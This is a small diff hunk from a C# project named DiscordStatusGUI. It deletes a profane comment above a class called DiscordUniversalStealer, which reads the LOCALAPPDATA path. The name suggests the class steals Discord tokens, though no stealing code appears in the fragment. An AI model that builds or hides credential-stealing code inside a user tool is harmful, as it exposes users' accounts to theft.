@@ -12,7 +12,6 @@ using PinkJson;
 
 namespace DiscordStatusGUI
 {
-    //What the fuck am I?
     class DiscordUniversalStealer
     {
         static string local = Environment.GetEnvironmentVariable("LOCALAPPDATA"),
